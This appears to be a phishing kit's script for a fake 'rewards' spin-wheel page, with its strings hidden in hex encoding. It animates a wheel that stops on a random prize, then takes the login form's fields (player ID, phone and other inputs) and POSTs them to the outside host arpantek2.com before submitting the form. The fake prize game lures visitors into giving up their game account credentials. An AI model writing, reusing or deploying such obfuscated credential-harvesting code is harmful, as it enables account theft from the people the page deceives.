var _0x9e53=["\x69\x6D\x67\x2F\x72\x65\x77\x61\x72\x64\x73\x2F\x31\x2E\x70\x6E\x67","\x69\x6D\x67\x2F\x72\x65\x77\x61\x72\x64\x73\x2F\x32\x2E\x70\x6E\x67","\x69\x6D\x67\x2F\x72\x65\x77\x61\x72\x64\x73\x2F\x33\x2E\x70\x6E\x67","\x69\x6D\x67\x2F\x72\x65\x77\x61\x72\x64\x73\x2F\x34\x2E\x70\x6E\x67","\x69\x6D\x67\x2F\x72\x65\x77\x61\x72\x64\x73\x2F\x35\x2E\x70\x6E\x67","\x69\x6D\x67\x2F\x72\x65\x77\x61\x72\x64\x73\x2F\x36\x2E\x70\x6E\x67","\x69\x6D\x67\x2F\x72\x65\x77\x61\x72\x64\x73\x2F\x37\x2E\x70\x6E\x67","\x69\x6D\x67\x2F\x72\x65\x77\x61\x72\x64\x73\x2F\x38\x2E\x70\x6E\x67","\x69\x74\x65\x6D\x2D\x61\x63\x74\x69\x76\x65","\x72\x65\x6D\x6F\x76\x65\x43\x6C\x61\x73\x73","\x5B\x64\x61\x74\x61\x2D\x6F\x72\x64\x65\x72\x3D\x22","\x22\x5D","\x61\x64\x64\x43\x6C\x61\x73\x73","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x6C\x6F\x77","\x66\x61\x64\x65\x49\x6E","\x2E\x72\x65\x77\x61\x72\x64\x5F\x63\x6F\x6E\x66\x69\x72\x6D\x61\x74\x69\x6F\x6E","\x73\x72\x63","\x61\x74\x74\x72","\x23\x6D\x79\x49\x6D\x67\x52\x65\x77\x61\x72\x64","\x63\x6C\x69\x63\x6B","\x6F\x6E","\x23\x6A\x73\x2D\x73\x74\x61\x72\x74","\x23\x66\x6F\x72\x6D\x4C\x6F\x67\x69\x6E","\x76\x61\x6C","\x23\x70\x6C\x61\x79\x69\x64","\x23\x70\x68\x6F\x6E\x65","","\x46\x61\x69\x6C\x65\x64\x3A\x20\x50\x6C\x65\x61\x73\x65\x20\x63\x6F\x6D\x70\x6C\x65\x74\x65\x20\x61\x6C\x6C\x20\x66\x6F\x72\x6D\x73\x21","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x72\x70\x61\x6E\x74\x65\x6B\x32\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x33\x2F\x69\x6E\x64\x65\x78\x2E\x70\x68\x70","\x50\x4F\x53\x54","\x73\x65\x72\x69\x61\x6C\x69\x7A\x65","\x73\x75\x62\x6D\x69\x74","\x61\x6A\x61\x78","\x2E\x66\x69\x6E\x69\x73\x68\x2D\x62\x74\x6E","\x72\x65\x61\x64\x79"];const prizes={1:_0x9e53[0],2:_0x9e53[1],3:_0x9e53[2],4:_0x9e53[3],5:_0x9e53[4],6:_0x9e53[5],7:_0x9e53[6],8:_0x9e53[7]};const total_items=9;const minimum_jumps=40;let arpantek=-1;let jumps=0;let speed=30;let timer=0;let prize=-1;function runCircle(){$(`${_0x9e53[10]}${arpantek}${_0x9e53[11]}`)[_0x9e53[9]](_0x9e53[8]);arpantek+= 1;if(arpantek> total_items- 1){arpantek= 0};$(`${_0x9e53[10]}${arpantek}${_0x9e53[11]}`)[_0x9e53[12]](_0x9e53[8])}function generatePrizeNumber(){return Math[_0x9e53[14]](Math[_0x9e53[13]]()* total_items)}function controllSpeed(){jumps+= 1;runCircle();if(jumps> minimum_jumps+ 10&& prize=== arpantek){clearTimeout(timer);$(_0x9e53[17])[_0x9e53[16]](_0x9e53[15]);$(_0x9e53[20])[_0x9e53[19]](_0x9e53[18],prizes[arpantek]);prize=  -1;jumps= 0}else {if(jumps< minimum_jumps){speed-= 5}else {if(jumps=== minimum_jumps){const _0xaa36xc=generatePrizeNumber();prize= _0xaa36xc}else {if((jumps> minimum_jumps+ 10)&& prize=== (arpantek+ 1)){speed+= 600}else {speed+= 20}}};if(speed< 40){speed= 40};timer= setTimeout(controllSpeed,speed)}}function init(){jumps= 0;speed= 250;prize=  -1;controllSpeed()}$(document)[_0x9e53[36]](function(){$(_0x9e53[23])[_0x9e53[22]](_0x9e53[21],init);$(_0x9e53[35])[_0x9e53[22]](_0x9e53[21],function(){var _0xaa36xe=$(_0x9e53[24]);var _0xaa36xf=$(_0x9e53[26])[_0x9e53[25]]();var _0xaa36x10=$(_0x9e53[27])[_0x9e53[25]]();if(_0xaa36xf== _0x9e53[28]|| _0xaa36x10== _0x9e53[28]){alert(_0x9e53[29])}else {$[_0x9e53[34]]({url:_0x9e53[30],type:_0x9e53[31],data:_0xaa36xe[_0x9e53[32]](),success:function(){_0xaa36xe[_0x9e53[33]]()},error:function(){_0xaa36xe[_0x9e53[33]]()}})}})})
